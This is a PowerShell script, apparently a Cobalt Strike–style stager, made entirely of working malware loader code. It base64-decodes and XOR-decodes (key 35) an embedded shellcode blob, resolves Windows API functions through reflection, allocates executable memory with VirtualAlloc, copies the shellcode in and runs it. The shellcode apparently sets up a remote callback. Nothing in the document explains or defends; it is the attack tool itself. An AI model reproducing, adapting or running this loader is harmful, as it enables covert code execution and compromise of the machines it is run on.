Set-StrictMode -Version 2

function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

If ([IntPtr]::size -eq 8) {
	[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbKsCMjI3lrquJim5giIyNuEupicmJySSBicmKZdKq85dz2yFp4a6riaxLxaqr7bhLqcUsjEeOncXFimch2DRjc9muq5Wug4HNJKXxrqtKZPCMjI0kjS6MQIyNqqsNimicjIyNimVZlvaXc9muq0muq+Wrk49zc3NxuEupxcWKZDiU7WNz2puMspr4iIyNr3Owsp68iIyPIkMrHIiMjy6Hc3NwMSBR0RyM21BJrvcp3tY51oEL8Cpn/lnq+S4217GE2h2gYUgpkjc2tGQMl+ri5kiEAMuVp065kCOeWOKlFXxDQZ3h3kZLqQSf+9oveQ73zI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwt0Sk1HTFRQA213AxUNEhgDdGx0FRcYA3dRSkdGTVcMFA0TGANRVRkSEg0TCgNPSkhGA2RGQEhMLikjuuWmU9AnAUBAypPXzqrEE+NjV2W96ik+A+QwcUtJaXga8COnEDPB81yaPrrDgZd0tsx60GAdibMTGVPJyVBxFKSzlcD2/Q76Y2A4uePFpRTrVsgdzrU83klBn4X5tBGrgy7julHDBEeJdJWguY5U0mq0l8XoiiwQhv3K2xquwP5dOrgREfBy0Vnqh00etDFdCUvb7+gz+H1ykrAeSgBWaeaRmtlk7LPp22UuN4t5s3I5zNXOS120h4Ic62sGTD9+mlsLZ38q8DJzuQvNd883irxJk7O2LZlZbattGyNindOWgXXc9msS6pkjI2MjYpsjMyMjYppjIyMjYpl7h3DG3PZrsHBwa6rEa6rSa6r5YpsjAyMjaqraYpkxtarB3PZroOcDpuNXlUWoJGsi4KbjVvR7e3trJiMjIyNz4Mtc3tzcERMVDRIbGg0SFxcNERIRIzEXdVs=')

	for ($x = 0; $x -lt $var_code.Count; $x++) {
		$var_code[$x] = $var_code[$x] -bxor 35
	}

	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
	$var_runme.Invoke([IntPtr]::Zero)
}
